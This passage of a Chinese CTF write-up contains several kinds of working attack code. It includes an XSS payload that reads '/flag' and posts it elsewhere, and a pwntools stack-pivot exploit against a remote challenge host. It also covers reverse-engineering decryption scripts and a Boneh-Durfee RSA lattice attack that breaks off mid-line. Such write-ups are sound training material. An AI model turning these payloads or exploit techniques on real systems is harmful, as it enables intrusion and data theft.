class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/content/2f9f1f36782a270b689d8c0f3e9e08df&#x27;</span>,&#123;</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>:<span class="string">&quot;content=123&quot;</span>%2bdata</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h2><p>首先是一个login的登录绕过，直接按照它的要求输就好了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180537716-735995572.png" alt="image-20241030180532038"></p><p>然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180542217-1925355468.png" alt="image-20241030180536624"></p><p>然后看到有给出完整后门，那么就好打了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180549697-1876912266.png" alt="image-20241030180544198"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180554685-1109696381.png" alt="image-20241030180549098"></p><p>直接栈迁移打system</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180600784-1355890361.png" alt="image-20241030180554897"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn&quot;</span>,<span class="number">44958</span>)</span><br><span class="line">sh_address=<span class="number">0x0804A038</span></span><br><span class="line">ret_address=<span class="number">0x08048674</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your username: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your password: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin123\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stac = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stac))</span><br><span class="line"></span><br><span class="line">payload = (p32(<span class="number">0x080485E6</span>)+p32(<span class="number">0</span>)+p32(sh_address)).ljust(<span class="number">80</span>,<span class="string">b&quot;\x00&quot;</span>)+p32(stac-<span class="number">4</span>)+p32(ret_address)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;plz input your msg:\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="REVERSE01"><a href="#REVERSE01" class="headerlink" title="REVERSE01"></a>REVERSE01</h2><p>安卓题，有混淆，先找MainActivity，锁定主要逻辑如下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180611619-2052552002.png" alt="image-20241030180605900"></p><p>主要就是跟其中的check方法，发现是native层加密逻辑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180616027-127520718.png" alt="image-20241030180610625"></p><p>那么直接解包apk去看逻辑，逻辑也相对清晰，主要加密逻辑有点眼熟，过一下gpt得知确实是sm4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180623464-1322363819.png" alt="image-20241030180617201"></p><p>那么直接找key嗦一把试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180630567-2040125301.png" alt="image-20241030180625061"></p><p>注意后面的这个Z0099864的赋值有个端序问题，做一个倒序就好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180638144-1936208116.png" alt="image-20241030180632275"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;Z0099864&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#4689900Z</span></span><br></pre></td></tr></table></figure><p>拼接起来之后把密文提取出来直接解SM4，跟进变量提取密文</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180642384-967731827.png" alt="image-20241030180636886"></p><p>最终解出flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180646848-1493421369.png" alt="image-20241030180641293"></p><h2 id="REVERSE02"><a href="#REVERSE02" class="headerlink" title="REVERSE02"></a>REVERSE02</h2><p>逻辑什么的都相当清楚了，然后结合题目给的信息，顾名思义四段加密</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180656646-1243407274.png" alt="image-20241030180651066"></p><p>第一段是乘以2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180702111-692318069.png" alt="image-20241030180656553"></p><p>第二段是异或</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180705623-1786287139.png" alt="image-20241030180700192"></p><p>第三段是自定义码表的一个base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180710945-1425284552.png" alt="image-20241030180705465"></p><p>第四段是解一个AES</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180716007-858819302.png" alt="image-20241030180710249"></p><p><strong>EXP：</strong></p><p>其中第三段解base64的结果为</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180729798-926729124.png" alt="image-20241030180723965"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">s2=[<span class="number">0x70</span>,<span class="number">0xCC</span>,<span class="number">0x62</span>,<span class="number">0xCA</span>,<span class="number">0x60</span>,<span class="number">0x6E</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;part1:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">round</span>(s2[i]/<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># #part1:81fe0766</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x7D</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x52</span>]</span><br><span class="line">xor_key=<span class="string">&quot;XorrLord&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart2:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]^<span class="built_in">ord</span>(xor_key[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#part2:197e1bc6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#part3:809832f4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;AesMasterAesMast&quot;</span>  </span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v4 = <span class="built_in">bytes</span>([<span class="number">251</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">171</span>, <span class="number">217</span>, <span class="number">136</span>, <span class="number">230</span>, <span class="number">11</span>, <span class="number">147</span>, <span class="number">124</span>, <span class="number">149</span>, <span class="number">235</span>, <span class="number">148</span>, <span class="number">219</span>, <span class="number">11</span>, <span class="number">84</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES ECB 模式解密 v4</span></span><br><span class="line">decrypted_data = cipher.decrypt(v4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart4:&quot;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#par4:d346fe66</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拼接起来得到最终的flag为<code>wdflag&#123;81fe0766197e1bc6809832f4d346fe66&#125;</code></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="CRYPTO02"><a href="#CRYPTO02" class="headerlink" title="CRYPTO02"></a>CRYPTO02</h2><p>直接上网搜索，找到原题</p><p><a href="https://www.cnblogs.com/mumuhhh/p/17789591.html">https://www.cnblogs.com/mumuhhh/p/17789591.html</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180739183-1151293321.png" alt="image-20241030180733303"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180744278-69578574.png" alt="image-20241030180738691"></p><p>根据给出的脚本进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.clock = time.time</span><br><span class="line"> </span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class="line"><span class="comment"># 显示有用矢量的统计数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示带有 0 和 X 的矩阵</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试删除无用的向量</span></span><br><span class="line"><span class="comment"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始从后面检查</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  如果它没有用</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># 让我们检查它是否影响其他向量</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># 如果另一个向量受到影响：</span></span><br><span class="line">                <span class="comment"># 我们增加计数</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 等级：0</span></span><br><span class="line">            <span class="comment"># 如果没有其他载体最终受到影响</span></span><br><span class="line">            <span class="comment"># 我们删除它</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># 等级：1</span></span><br><span class="line">            <span class="comment">#如果只有一个受到影响，我们会检查</span></span><br><span class="line">            <span class="comment"># 如果它正在影响别的向量</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># 如果它影响哪怕一个向量</span></span><br><span class="line">                    <span class="comment"># 我们放弃这个</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class="line">                <span class="comment"># 这个有用的向量不够有用</span></span><br><span class="line">                <span class="comment">#与我们无用的相比</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 在以下情况下找到解决方案：</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#多项式环</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-移位</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 x 移位列表</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#对于多项式中的单项式。单项式（）：</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># 如果单项不在单项中</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-移位</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 单项式 y 移位列表</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 构造格 B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#约化格的原型</span></span><br><span class="line">    <span class="keyword">if</span> 